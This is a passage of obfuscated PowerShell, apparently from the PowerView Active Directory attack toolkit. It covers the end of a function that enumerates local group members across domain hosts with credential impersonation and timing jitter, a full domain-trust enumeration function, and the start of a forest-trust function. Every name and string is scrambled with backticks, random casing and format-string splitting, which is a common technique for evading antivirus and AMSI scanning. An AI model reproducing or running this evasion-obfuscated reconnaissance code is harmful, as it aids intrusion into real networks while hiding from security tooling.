        if (${p`SBou`Nd`PArA`MEteRs}[("{2}{3}{1}{0}"-f'eName','it','Comp','uterS')]) { ${COmpuT`E`RSe`ArcherA`RGuM`eN`Ts}[("{0}{1}" -f'Si','teName')] = ${s`ITE`NAme} }
        if (${PSB`oundPar`A`M`eTErs}[("{0}{1}"-f 'Se','rver')]) { ${comPU`TERS`EArCHERarg`UM`eNTS}[("{1}{0}"-f 'erver','S')] = ${s`E`Rver} }
        if (${Psb`OUNdPa`R`AME`TE`RS}[("{1}{2}{3}{0}"-f 'cope','S','earch','S')]) { ${cOmpUTERSE`ArCHERArg`U`me`Nts}[("{0}{1}{2}" -f 'SearchS','c','ope')] = ${s`ea`RChSCOpe} }
        if (${PS`BOUNdp`AR`AMe`T`erS}[("{0}{1}{3}{2}" -f'Res','ultPag','e','eSiz')]) { ${C`o`mp`Ute`RseAR`ChERARgumEN`Ts}[("{0}{3}{1}{2}" -f'R','ltPage','Size','esu')] = ${RES`ULtpA`GE`SI`ZE} }
        if (${PSbO`UNDP`A`RaME`TErs}[("{0}{2}{3}{1}{4}" -f'Ser','eLim','ve','rTim','it')]) { ${CoMP`UTe`RS`eArcHER`AR`G`UmE`NTs}[("{2}{3}{0}{1}"-f 'i','mit','Serv','erTimeL')] = ${S`ERVer`TIMe`LimIt} }
        if (${PsB`oUNdPA`R`AmE`TERS}[("{2}{1}{0}" -f 'e','mbston','To')]) { ${co`mpUterSea`R`c`HErARgU`men`Ts}[("{0}{1}" -f'Tombs','tone')] = ${ToM`BST`O`NE} }
        if (${pSb`ouN`dp`A`Ra`mEtERS}[("{1}{0}{2}"-f'e','Cr','dential')]) { ${comP`UtERSeaRc`hE`Ra`Rg`UmeNTs}[("{0}{2}{1}" -f 'Cr','ential','ed')] = ${Cr`E`denTiAL} }

        if (${P`sbOUN`dPAraMeTe`RS}[("{0}{2}{1}{3}" -f 'C','mp','o','uterName')]) {
            ${TaRG`EtcoMPu`TE`RS} = ${comP`UT`eRNAme}
        }
        else {
            &("{2}{1}{3}{0}" -f 'se','e-Ve','Writ','rbo') ("{5}{1}{4}{2}{17}{14}{16}{7}{6}{0}{10}{15}{12}{9}{8}{3}{13}{11}"-f 'co','nd-D','L','m','omain','[Fi',' ','g','o','e d','mp','in','in th','a','Member] Quer','uters ','yin','ocalGroup')
            ${TARgEtc`Ompu`TE`Rs} = &("{1}{2}{0}{3}"-f 'C','G','et-Domain','omputer') @ComputerSearcherArguments | &("{2}{0}{1}"-f '-Ob','ject','Select') -ExpandProperty ("{2}{1}{0}"-f'e','ostnam','dnsh')
        }
        &("{0}{2}{3}{1}" -f'W','ose','rite','-Verb') "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length) "
        if (${t`ArgE`T`CompUTE`Rs}."le`N`gTh" -eq 0) {
            throw ("{1}{9}{5}{3}{2}{7}{0}{8}{6}{4}" -f 'Member','[Find','nLo','omai','ate','D','nd to enumer','calGroup','] No hosts fou','-')
        }

        
        ${H`o`S`Ten`UMBLOcK} = {
            Param(${COmP`UT`er`N`Ame}, ${G`R`OupnaME}, ${mE`Th`oD}, ${tOKenh`ANd`LE})

            
            if (${grO`UpN`Ame} -eq ("{3}{2}{0}{1}" -f'strato','rs','mini','Ad')) {
                ${AdmINSECU`RI`TYiDe`N`TIf`iER} = &("{1}{2}{0}" -f 't','New-Obj','ec') ("{7}{2}{5}{4}{0}{1}{6}{3}"-f'incipal.Securi','t','st','ntifier','rity.Pr','em.Secu','yIde','Sy')( (&("{1}{0}{2}" -f't-','Ge','vaRiaBLE')  ('M2j'+'lre')  )."V`ALUe"::"buIL`TInad`m`I`NiS`TRAToRSsId",${nU`LL})
                ${groUP`N`A`me} = (${AdMiNSE`cUr`I`TY`iden`TiF`i`Er}."trAN`s`LAte"([System.Security.Principal.NTAccount])."vA`Lue" -split "\\")[-1]
            }

            if (${t`OKeN`H`ANDle}) {
                
                ${N`UlL} = &("{1}{0}{2}{3}{5}{6}{4}" -f'ser','Invoke-U','I','mp','n','er','sonatio') -TokenHandle ${TO`kENHA`ND`le} -Quiet
            }

            ForEach (${T`ArgE`Tc`OM`pUtER} in ${COMP`UtE`RNAME}) {
                ${up} = &("{2}{3}{0}{1}" -f'nec','tion','Test-Co','n') -Count 1 -Quiet -ComputerName ${TAr`ge`TCoMPUt`eR}
                if (${UP}) {
                    ${nEtLO`cALGrouP`mEmBe`Ra`R`Gu`M`E`Nts} = @{
                        ("{3}{2}{0}{1}" -f'ute','rName','mp','Co') = ${Ta`Rg`e`TCOmPUter}
                        ("{1}{0}" -f'd','Metho') = ${m`ETH`od}
                        ("{1}{3}{2}{0}"-f 'e','Gr','m','oupNa') = ${g`ROupNa`mE}
                    }
                    &("{3}{4}{0}{1}{5}{2}{6}" -f't-NetLocalG','ro','Mem','G','e','up','ber') @NetLocalGroupMemberArguments
                }
            }

            if (${toK`eNH`A`NdlE}) {
                &("{1}{4}{3}{2}{5}{0}"-f'elf','Invoke-','To','evert','R','S')
            }
        }

        ${L`ogoN`T`OkeN} = ${NU`lL}
        if (${P`sBOUNDP`Aram`ETErs}[("{0}{2}{1}"-f 'Cr','ntial','ede')]) {
            if (${ps`BOuNDPaRa`met`ERS}[("{0}{1}"-f'De','lay')] -or ${psbOunDpa`R`AmE`Ters}[("{4}{2}{3}{0}{1}"-f 'cces','s','p','OnSu','Sto')]) {
                ${l`oGOntoK`EN} = &("{2}{1}{0}{3}{4}"-f'rImpe','e','Invoke-Us','rso','nation') -Credential ${c`REDen`TIAl}
            }
            else {
                ${L`OG`oNtokEN} = &("{4}{0}{1}{5}{3}{2}" -f'ok','e-U','tion','Impersona','Inv','ser') -Credential ${C`RE`deNt`iaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${pSbOun`D`P`ARAmEtE`Rs}[("{0}{1}" -f 'D','elay')] -or ${psb`o`UNDparAMet`eRS}[("{2}{1}{0}" -f'cess','uc','StopOnS')]) {

            &("{3}{1}{0}{2}"-f'bos','ite-Ver','e','Wr') "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count) "
            &("{0}{2}{3}{1}"-f 'Wr','se','ite','-Verbo') ('[Fi'+'nd-Do'+'mainLo'+'calG'+'r'+'ou'+'pMember]'+' '+'De'+'l'+'ay: '+"$Delay, "+'J'+'itter'+': '+"$Jitter")
            ${cOuNt`er} = 0
            ${r`ANDNO} = &("{0}{2}{1}" -f 'Ne','Object','w-') ("{0}{2}{1}" -f 'Syste','om','m.Rand')

            ForEach (${tA`RgEtComP`UT`er} in ${TArGe`T`c`Om`PuterS}) {
                ${C`oU`NTeR} = ${cO`UNTER} + 1

                
                &("{2}{1}{3}{0}" -f'ep','rt-S','Sta','le') -Seconds ${Ra`N`dno}.("{0}{1}" -f'Ne','xt').Invoke((1-${ji`TTEr})*${del`AY}, (1+${JItT`ER})*${d`Elay})

                &("{2}{1}{3}{0}" -f '-Verbose','r','W','ite') "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{0}{1}{2}" -f'Invoke-','Com','mand') -ScriptBlock ${H`O`STEnUmB`l`Ock} -ArgumentList ${tAr`Ge`TCOMpu`TeR}, ${gR`ouP`N`AmE}, ${mET`HOd}, ${l`OgoN`T`OKEn}
            }
        }
        else {
            &("{3}{2}{1}{4}{0}" -f'se','te-V','ri','W','erbo') ('[F'+'i'+'nd-Domain'+'Loca'+'lGr'+'oup'+'Memb'+'e'+'r'+'] '+'Usin'+'g '+'t'+'h'+'rea'+'ding '+'with'+' '+'th'+'read'+'s:'+' '+"$Threads")

            
            ${ScrIPT`p`A`RAms} = @{
                ("{1}{0}{2}"-f'am','GroupN','e') = ${Gr`OU`PnAme}
                ("{0}{1}" -f'M','ethod') = ${mE`TH`oD}
                ("{1}{2}{0}"-f 'andle','Toke','nH') = ${lOG`onTO`Ken}
            }

            
            &("{6}{5}{0}{4}{2}{1}{3}" -f'F','t','c','ion','un','d','New-Threade') -ComputerName ${T`A`RgEtcoMp`UTers} -ScriptBlock ${HO`stEn`UMBLo`Ck} -ScriptParameters ${sCrI`Ptpa`R`Ams} -Threads ${T`HR`EADs}
        }
    }

    END {
        if (${LoGo`N`T`OKEn}) {
            &("{3}{0}{2}{1}" -f'ke-Rev','ToSelf','ert','Invo') -TokenHandle ${Logon`Tok`En}
        }
    }
}








function GET-d`OMAiNtru`st {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{4}{0}{2}"-f 'oce','ldP','ss','PSShou','r'}, '')]
    [OutputType({"{6}{2}{1}{4}{5}{0}{3}"-f 'w.Dom','e','ow','ainTrust.NET','rV','ie','P'})]
    [OutputType({"{6}{1}{2}{0}{5}{4}{3}"-f'w.Do','we','rVie','AP','nTrust.LD','mai','Po'})]
    [OutputType({"{5}{0}{4}{1}{2}{3}" -f'rVie','omainTrust.A','P','I','w.D','Powe'})]
    [CmdletBinding(DEFAuLtParameteRsetname = {"{1}{0}" -f 'P','LDA'})]
    Param(
        [Parameter(pOSItIOn = 0, ValUeFrOMpiPelInE = ${t`RUe}, vALuEfrompIPElinebypRopeRtYNAME = ${T`RUe})]
        [Alias({"{1}{0}"-f'e','Nam'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`AIN},

        [Parameter(ParAMeTersETNaME = 'API')]
        [Switch]
        ${a`PI},

        [Parameter(pArAmEtERSETname = 'NET')]
        [Switch]
        ${N`Et},

        [Parameter(PARametErsETnaMe = "l`dAp")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'ilter','F'})]
        [String]
        ${LDa`PF`Il`TEr},

        [Parameter(ParamETERSEtNaME = "lD`Ap")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PrOpE`RtI`ES},

        [Parameter(paRAMeteRseTNAME = "lD`AP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 'SP','AD','ath'})]
        [String]
        ${SEar`cH`Base},

        [Parameter(paRAMEtERSETnaMe = "ld`Ap")]
        [Parameter(PARaMETErsETNaME = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{0}{2}"-f 'inCon','ma','troller','Do'})]
        [String]
        ${S`eR`VER},

        [Parameter(paRameterSETNAme = "lD`Ap")]
        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{2}{1}{0}"-f'evel','L','One'}, {"{0}{1}"-f'Subt','ree'})]
        [String]
        ${s`Ear`c`HscOpe} = ("{1}{0}" -f 'ee','Subtr'),

        [Parameter(pARaMeteRSeTNAMe = "L`dap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${rESuLTpAG`E`size} = 200,

        [Parameter(pArAMetERSETNamE = "ld`AP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`VERTi`m`eLIMIt},

        [Parameter(paRamETeRSeTnAMe = "l`DAp")]
        [Switch]
        ${tO`mbsT`ONE},

        [Alias({"{2}{0}{1}"-f 'On','e','Return'})]
        [Switch]
        ${Fi`Nd`one},

        [Parameter(PARAMETersEtnAme = "LD`AP")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDEnTi`AL} =  (&("{2}{0}{1}"-f 't-it','eM','gE')  ("{0}{1}{3}{2}"-f 'var','iAB','h3xo6','le:j') )."vAL`UE"::"Emp`TY"
    )

    BEGIN {
        ${t`Ru`stAt`T`RIBUTes} = @{
            [uint32]("{2}{0}{1}{3}" -f '00','0','0x00','001') = ("{0}{3}{1}{2}"-f 'NO','RANSITI','VE','N_T')
            [uint32]("{1}{2}{0}{3}" -f '0','0x0','0000','02') = ("{1}{0}{2}{3}" -f'PLEVE','U','L_O','NLY')
            [uint32]("{1}{0}{2}"-f'0','0x','0000004') = ("{0}{2}{1}"-f'FI','DS','LTER_SI')
            [uint32]("{0}{2}{1}" -f'0x00','0008','00') = ("{1}{0}{2}{3}"-f'RES','FO','T_','TRANSITIVE')
            [uint32]("{1}{0}{2}{3}" -f '0','0x','00','00010') = ("{2}{3}{0}{1}" -f'Z','ATION','C','ROSS_ORGANI')
            [uint32]("{2}{0}{1}"-f '000000','20','0x') = ("{0}{1}{2}"-f 'WI','THI','N_FOREST')
            [uint32]("{1}{2}{0}" -f '40','0x0000','00') = ("{4}{3}{0}{2}{1}" -f'TER','L','NA','_EX','TREAT_AS')
            [uint32]("{1}{2}{0}"-f '00000080','0','x') = ("{5}{4}{2}{1}{0}{6}{3}"-f'_','4','SES_RC','N','T_U','TRUS','ENCRYPTIO')
            [uint32]("{0}{2}{1}"-f '0x0','00100','00') = ("{4}{2}{1}{3}{5}{0}"-f'YS','ST_U','RU','SES_A','T','ES_KE')
            [uint32]("{2}{0}{1}" -f'000','00200','0x') = ("{4}{1}{0}{3}{2}{5}"-f'TION_NO_TGT_DEL','ANIZA','O','EGATI','CROSS_ORG','N')
            [uint32]("{1}{0}{2}"-f '00000','0x','400') = ("{2}{0}{1}" -f'IM_','TRUST','P')
        }

        ${LDaPSE`A`RCh`E`R`A`RGUMEntS} = @{}
        if (${P`sbouNDPaR`AM`Et`ERs}[("{0}{2}{1}"-f 'D','in','oma')]) { ${LDAP`S`EARc`heRAR`G`U`MENTS}[("{0}{1}" -f'Doma','in')] = ${d`OMain} }
        if (${p`sb`O`UNDpARAmet`ErS}[("{1}{2}{0}"-f'lter','LDAP','Fi')]) { ${lda`pSea`R`chE`RA`RGumEn`TS}[("{0}{2}{1}" -f 'LDAPFil','er','t')] = ${L`dApFi`ltEr} }
        if (${psb`oUNd`Par`AM`Ete`Rs}[("{3}{2}{1}{0}" -f's','ie','pert','Pro')]) { ${ld`A`PSeARcHErar`GuMeN`TS}[("{1}{2}{3}{0}" -f'ties','P','rope','r')] = ${PrOpeR`T`I`eS} }
        if (${P`sBouNd`P`AR`Am`EtERs}[("{2}{3}{0}{1}"-f 'ar','chBase','S','e')]) { ${LdAPS`EarCh`erARGu`Men`TS}[("{2}{0}{1}" -f 'earch','Base','S')] = ${seA`RCHb`ASe} }
        if (${PSboun`Dp`A`Ra`meTErs}[("{0}{1}" -f'Se','rver')]) { ${l`DaP`SEarchEra`R`gU`mEnts}[("{2}{1}{0}" -f'er','erv','S')] = ${seR`VEr} }
        if (${PSB`OU`N`DPArAmet`ers}[("{1}{0}{3}{2}" -f 'rch','Sea','e','Scop')]) { ${LD`A`PsE`A`RcheRARgUmE`NtS}[("{2}{1}{0}{3}"-f'hSco','arc','Se','pe')] = ${SE`ARC`hSC`ope} }
        if (${P`sb`OUNd`P`ARAMe`TeRs}[("{2}{3}{1}{0}" -f'ze','ltPageSi','R','esu')]) { ${ldap`s`EAR`CHErArg`UM`eNts}[("{3}{0}{2}{1}{4}" -f 'u','z','ltPageSi','Res','e')] = ${resuLTPA`GE`Si`ze} }
        if (${psboUNDPAr`Am`E`T`ErS}[("{2}{0}{1}" -f'er','verTimeLimit','S')]) { ${LD`Ap`s`Ear`CH`ErArgum`ENtS}[("{1}{2}{3}{4}{0}"-f't','Serv','erTim','eLi','mi')] = ${ser`VErti`Me`lIM`it} }
        if (${PSbO`UN`dparaME`TeRs}[("{0}{1}{2}"-f 'Tomb','ston','e')]) { ${lDaP`S`eARCHE`Ra`R`GUMENTS}[("{1}{0}{2}" -f'bsto','Tom','ne')] = ${tOmBs`TO`Ne} }
        if (${p`SbOuNDpAr`A`met`eRs}[("{1}{0}{2}"-f 'nti','Crede','al')]) { ${L`DAps`e`A`RcHer`ARgUMeNTs}[("{3}{2}{1}{0}" -f 'l','ntia','ede','Cr')] = ${credEnT`I`Al} }
    }

    PROCESS {
        if (${pS`cM`dLET}.PaRAMeTErSEtnaME -ne 'API') {
            ${neT`SeaR`CHerAR`G`UMen`Ts} = @{}
            if (${dOmA`iN} -and ${D`OmaIN}.("{0}{1}" -f 'Tr','im').Invoke() -ne '') {
                ${s`oUrC`EDoMa`IN} = ${D`oMain}
            }
            else {
                if (${pS`BouNdpAraM`etE`RS}[("{1}{0}{2}" -f'edenti','Cr','al')]) {
                    ${S`oUR`CE`d`OmAiN} = (&("{2}{1}{0}"-f 'ain','m','Get-Do') -Credential ${CRe`dE`NTIAL})."NA`Me"
                }
                else {
                    ${sou`Rce`dO`maiN} = (&("{0}{2}{1}" -f 'Get-Doma','n','i'))."nA`me"
                }
            }
        }
        elseif (${psc`m`DL`et}.PaRAmetERSetNaME -ne 'NET') {
            if (${DOM`AiN} -and ${D`oM`Ain}.("{0}{1}"-f 'Tri','m').Invoke() -ne '') {
                ${S`O`Urc`edOMAIN} = ${dOm`Ain}
            }
            else {
                ${Sou`R`cEdoMA`IN} = ${ENV:`USerDnSDO`m`A`in}
            }
        }

        if (${Psc`md`LeT}.PArAmeTERSeTnamE -eq ("{1}{0}"-f'P','LDA')) {
            
            ${Tr`U`sT`seArcH`eR} = &("{3}{0}{4}{2}{1}" -f 'DomainSe','r','rche','Get-','a') @LdapSearcherArguments
            ${S`OurCes`id} = &("{1}{0}{2}"-f 't-Domai','Ge','nSID') @NetSearcherArguments

            if (${tRu`ST`SEARcher}) {

                ${t`RUSTSE`AR`Ch`Er}."F`iLTeR" = (("{7}{3}{0}{5}{1}{6}{4}{2}"-f 'ass=t','Do',')','objectCl','ain','rusted','m','('))

                if (${pSbouN`D`P`ARAmETe`RS}[("{0}{1}"-f 'Find','One')]) { ${reSu`L`TS} = ${tr`U`sts`EARcher}.("{0}{1}" -f 'F','indOne').Invoke() }
                else { ${r`EsU`lTs} = ${T`RuSTSEaRCh`ER}.("{1}{2}{0}"-f'l','F','indAl').Invoke() }
                ${R`esUltS} | &("{0}{2}{1}" -f'Wh','ject','ere-Ob') {${_}} | &("{1}{2}{0}" -f 't','ForEach-','Objec') {
                    ${p`R`OPs} = ${_}."p`RoP`ER`TiEs"
                    ${dOmai`Nt`Ru`st} = &("{3}{0}{1}{2}"-f 'w-O','bj','ect','Ne') ("{1}{0}" -f'bject','PSO')

                    ${TruSta`TT`R`IB} = @()
                    ${tRust`A`Tt`RIb} += ${T`RuS`TATtr`i`BuTes}."KE`Ys" | &("{0}{2}{1}{3}"-f'W','re-O','he','bject') { ${PRo`PS}."T`RuSTa`TTri`B`UTes"[0] -band ${_} } | &("{2}{1}{4}{3}{0}"-f 't','orEa','F','Objec','ch-') { ${tR`UstA`T`TrIbUT`Es}[${_}] }

                    ${di`R`ecTiON} = Switch (${P`ROPS}."Tru`S`TDIRE`cTIoN") {
                        0 { ("{2}{1}{0}" -f 'ed','sabl','Di') }
                        1 { ("{0}{1}" -f'Inbou','nd') }
                        2 { ("{2}{0}{1}"-f'u','nd','Outbo') }
                        3 { ("{0}{3}{2}{1}"-f'Bidir','al','on','ecti') }
                    }

                    ${t`RuS`T`TyPE} = Switch (${P`ROPs}."Tr`Ustt`YPe") {
                        1 { ("{1}{3}{6}{4}{5}{0}{7}{2}"-f 'D','W','ECTORY','INDO','ON_','ACTIVE_','WS_N','IR') }
                        2 { ("{2}{1}{0}{4}{3}" -f 'TI','C','WINDOWS_A','ORY','VE_DIRECT') }
                        3 { 'MIT' }
                    }

                    ${di`StiNgUIs`h`eD`Name} = ${prO`PS}."D`IsTINgUisH`EDNa`ME"[0]
                    ${soUr`cEnA`MeI`NDEX} = ${DISTiN`g`UisHednA`ME}.("{2}{0}{1}"-f'ndexO','f','I').Invoke('DC=')
                    if (${s`o`URcen`Ame`inDEX}) {
                        ${s`oU`RcE`do`maiN} = $(${dist`in`gui`SHED`NA`ME}.("{3}{0}{2}{1}"-f 'b','tring','S','Su').Invoke(${S`O`URCenAme`iNdEX})) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        ${s`OURce`DO`MAIN} = ""
                    }

                    ${T`A`R`GeTNAM`eInDEX} = ${D`iSTi`N`guiSh`EDna`mE}.("{2}{1}{0}"-f 'f','xO','Inde').Invoke(("{0}{2}{1}{3}" -f ',C','e','N=Syst','m'))
                    if (${SouR`C`EN`AMein`deX}) {
                        ${TarGET`DO`MaiN} = ${DistiN`g`UISHeDNA`me}.("{2}{0}{1}"-f'ri','ng','SubSt').Invoke(3, ${tARgEtn`AMe`I`N`DEX}-3)
                    }
                    else {
                        ${TAr`GeTD`OmaiN} = ""
                    }

                    ${obJEC`TgU`id} = &("{0}{2}{1}"-f'New','Object','-') ("{1}{0}" -f 'uid','G') @(,${P`ROps}."obj`e`CtguiD"[0])
                    ${t`ArgeTs`id} = (&("{1}{0}{2}" -f '-Obje','New','ct') ("{10}{7}{4}{5}{11}{2}{6}{0}{1}{9}{8}{3}" -f'.Secu','rit','.Prin','r','m.','S','cipal','te','entifie','yId','Sys','ecurity')(${pRO`Ps}."sEc`URITYID`E`NtI`FiER"[0],0))."V`AlUe"

                    ${DOma`inT`R`UsT} | &("{3}{2}{1}{0}"-f 'r','e','mb','Add-Me') ("{0}{2}{3}{1}"-f 'No','perty','te','pro') ("{2}{1}{0}" -f 'ame','N','Source') ${sOu`R`cedoMain}
                    ${DomaI`Ntr`Ust} | &("{0}{2}{1}"-f'Add-','r','Membe') ("{2}{1}{0}"-f 'ty','eproper','Not') ("{2}{1}{0}"-f'tName','rge','Ta') ${p`R`opS}."n`AmE"[0]
                    
                    ${D`oMaIn`T`RUST} | &("{3}{0}{1}{2}" -f 'dd-Mem','b','er','A') ("{2}{1}{0}" -f 'roperty','ep','Not') ("{1}{0}"-f 'stType','Tru') ${tRU`ST`TYPE}
                    ${Do`maintr`U`ST} | &("{0}{3}{1}{2}" -f 'Add','Membe','r','-') ("{1}{0}{2}" -f 'p','Notepro','erty') ("{2}{1}{0}{4}{3}"-f't','rus','T','s','Attribute') $(${t`R`Us`TaTtrIb} -join ',')
                    ${D`omaINT`RUst} | &("{1}{0}{2}" -f 'dd-M','A','ember') ("{2}{0}{1}"-f 'pro','perty','Note') ("{1}{0}{2}{3}{4}" -f'r','T','ustD','i','rection') "$Direction"
                    ${doma`InT`Ru`ST} | &("{0}{2}{1}"-f'Add-','er','Memb') ("{2}{3}{1}{0}"-f 'ty','proper','No','te') ("{2}{0}{3}{1}" -f'e','ated','Wh','nCre') ${PR`O`pS}."WHE`NcReA`TEd"[0]
                    ${dOMa`In`TRU`st} | &("{0}{2}{1}"-f 'A','er','dd-Memb') ("{3}{2}{1}{0}"-f'y','ropert','ep','Not') ("{2}{0}{1}{3}"-f 'henCh','a','W','nged') ${pRo`ps}."wHe`N`c`haNGED"[0]
                    ${d`Omai`Ntru`ST}."P`sobJ`ECT"."tYP`En`A`MES".("{1}{0}" -f 'nsert','I').Invoke(0, ("{1}{4}{5}{0}{2}{3}"-f 'a','PowerView','inTrust.LD','AP','.','Dom'))
                    ${d`OMaINTr`USt}
                }
                if (${R`eSULTs}) {
                    try { ${r`e`sulTs}.("{1}{0}" -f'spose','di').Invoke() }
                    catch {
                        &("{0}{3}{1}{2}" -f 'Wr','erbo','se','ite-V') ('[Get'+'-Do'+'mainTrust]'+' '+'Error'+' '+'dispo'+'si'+'ng '+'o'+'f '+'th'+'e '+'Re'+'su'+'lts '+'obj'+'ect'+': '+"$_")
                    }
                }
                ${TRuSTS`eA`RcH`er}.("{0}{2}{1}" -f'di','ose','sp').Invoke()
            }
        }
        elseif (${psCm`d`Let}.pAramETErseTnaME -eq 'API') {
            
            if (${P`S`B`oUNDPara`Me`Ters}[("{0}{1}" -f 'Ser','ver')]) {
                ${T`ARgeTDC} = ${SER`V`er}
            }
            elseif (${dom`Ain} -and ${D`o`mAiN}.("{1}{0}"-f'im','Tr').Invoke() -ne '') {
                ${TA`R`geTdc} = ${doma`In}
            }
            else {
                
                ${TArg`EtDc} = ${N`ULL}
            }

            
            ${pTrin`Fo} =   ${9`RZQ}::"Ze`RO"

            
            ${FLa`gS} = 63
            ${d`omA`inCO`UNt} = 0

            
            ${RE`sult} = ${NE`TAP`I32}::"DsEN`UMera`TE`dOma`inTrUSTs"(${T`Ar`GE`TDc}, ${Fl`A`Gs}, [ref]${pT`RIn`FO}, [ref]${DO`MaI`NcOu`NT})

            
            ${oFf`S`et} = ${pT`Rinfo}.("{1}{0}" -f '4','ToInt6').Invoke()

            
            if ((${rE`sUlT} -eq 0) -and (${o`F`FsET} -gt 0)) {

                
                ${incRe`me`Nt} = ${Ds`_doMA`in`_Tru`STS}::("{2}{0}{1}" -f'tSiz','e','Ge').Invoke()

                
                for (${i} = 0; (${I} -lt ${dOM`A`In`COUnt}); ${I}++) {
                    
                    ${NEw`iN`TPtR} = &("{1}{0}{3}{2}" -f'w-O','Ne','ject','b') ("{3}{2}{0}{1}" -f'.In','tptr','ystem','S') -ArgumentList ${O`Ffs`et}
                    ${i`NFO} = ${NEw`INt`P`Tr} -as ${d`S_dOma`in`_trUStS}

                    ${O`FFs`Et} = ${n`EwIntP`TR}.("{1}{0}{2}"-f't6','ToIn','4').Invoke()
                    ${Of`F`SeT} += ${I`N`CrEMe`Nt}

                    ${sid`s`TRiNG} = ''
                    ${REsu`lT} = ${a`dVaPI`32}::"Co`NvErTS`I`d`TOStri`NG`sID"(${iN`Fo}."doMAin`S`ID", [ref]${s`iD`St`RINg});${L`AsTE`RroR} =  ${Xz`N`LS}::("{1}{3}{4}{2}{0}"-f'r','Ge','32Erro','tLa','stWin').Invoke()

                    if (${r`EsuLT} -eq 0) {
                        &("{1}{2}{3}{4}{0}"-f'e','Wr','ite-','Verb','os') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                    }
                    else {
                        ${d`om`AINtRu`st} = &("{2}{0}{1}" -f 'c','t','New-Obje') ("{2}{0}{1}" -f'je','ct','PSOb')
                        ${Do`maI`N`TrUsT} | &("{2}{1}{0}" -f 'Member','d-','Ad') ("{0}{1}{2}" -f'Note','pro','perty') ("{3}{2}{0}{1}" -f'ceN','ame','our','S') ${s`ouR`ced`oMAiN}
                        ${DOmA`i`NTruST} | &("{1}{2}{0}"-f 'ber','Add-Me','m') ("{3}{2}{0}{1}" -f 'r','ty','rope','Notep') ("{2}{3}{1}{0}"-f'me','a','Tar','getN') ${I`Nfo}."dnSd`omaiNNA`Me"
                        ${Do`maiNT`Ru`ST} | &("{1}{2}{0}" -f'ember','Add','-M') ("{0}{1}{2}"-f 'Notep','rop','erty') ("{1}{2}{4}{3}{0}" -f 'ame','Tar','getNe','biosN','t') ${in`FO}."NetBiOsDO`m`AINNA`me"
                        ${dO`ma`InTR`USt} | &("{2}{0}{1}{3}"-f'd-Me','mbe','Ad','r') ("{0}{3}{1}{2}"-f'N','eprope','rty','ot') ("{1}{0}"-f 'gs','Fla') ${I`NFo}."fLA`Gs"
                        ${dO`MA`INtrust} | &("{2}{0}{1}"-f'mbe','r','Add-Me') ("{1}{2}{0}" -f'ty','Notepr','oper') ("{0}{1}{2}"-f 'Pa','rentI','ndex') ${iN`Fo}."pAR`E`Nt`iNDex"
                        ${D`omAinT`R`UST} | &("{2}{3}{1}{0}"-f 'er','b','Ad','d-Mem') ("{3}{1}{2}{0}" -f 'y','prop','ert','Note') ("{0}{1}" -f 'TrustTy','pe') ${i`Nfo}."T`RUstty`pe"
                        ${DOmA`inT`R`UST} | &("{1}{2}{0}" -f 'ber','Ad','d-Mem') ("{2}{1}{0}{3}"-f 'p','tepro','No','erty') ("{2}{0}{1}"-f'ttr','ibutes','TrustA') ${IN`Fo}."TRUsT`ATT`Ri`BuTes"
                        ${DOmA`int`RUSt} | &("{1}{0}{2}"-f 'Membe','Add-','r') ("{0}{3}{2}{1}" -f 'Notepro','y','ert','p') ("{0}{1}{2}"-f 'Tar','getS','id') ${sID`ST`RiNG}
                        ${D`Omain`Tr`Ust} | &("{2}{3}{1}{0}" -f'r','be','Add-M','em') ("{3}{2}{1}{0}" -f 'y','ert','prop','Note') ("{2}{1}{0}"-f 'etGuid','g','Tar') ${i`Nfo}."dom`A`inguID"
                        ${domA`In`T`RUst}."ps`OBj`eCT"."T`y`PENAM`es".("{1}{0}" -f 'sert','In').Invoke(0, ("{4}{1}{5}{0}{3}{6}{7}{2}" -f 'w.D','rVi','ust.API','om','Powe','e','ain','Tr'))
                        ${d`OMAInT`Rust}
                    }
                }
                
                ${nu`Ll} = ${NeTaP`I`32}::("{2}{0}{3}{1}" -f 'fer','ee','NetApiBuf','Fr').Invoke(${P`TRiN`FO})
            }
            else {
                &("{0}{2}{1}"-f 'Wri','bose','te-Ver') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
        else {
            
            ${FoUnD`dO`mA`In} = &("{1}{2}{0}"-f 'in','G','et-Doma') @NetSearcherArguments
            if (${fOUN`ddO`ma`in}) {
                ${f`oU`NDDOMa`in}.("{6}{2}{4}{0}{3}{1}{5}"-f 'rus','ions','l','tRelat','lT','hips','GetA').Invoke() | &("{2}{1}{3}{0}" -f't','h-Ob','ForEac','jec') {
                    ${_}."Pso`BJecT"."TYp`EnA`M`ES".("{0}{1}"-f'I','nsert').Invoke(0, ("{0}{1}{4}{3}{5}{2}" -f 'P','owerVie','t.NET','n','w.Domai','Trus'))
                    ${_}
                }
            }
        }
    }
}


function geT-f`OreS`TTRU`st {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}{4}" -f 'SS','Pro','hould','P','cess'}, '')]
    [OutputType({"{0}{1}{5}{4}{3}{2}" -f'P','o','T','restTrust.NE','o','werView.F'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTIon = 0, ValuEfROmPiPelInE = ${tR`UE}, vALuEfrOmPiPElINeBYproPerTYNAME = ${Tr`UE})]
        [Alias({"{1}{0}"-f'e','Nam'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fo`ReST},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
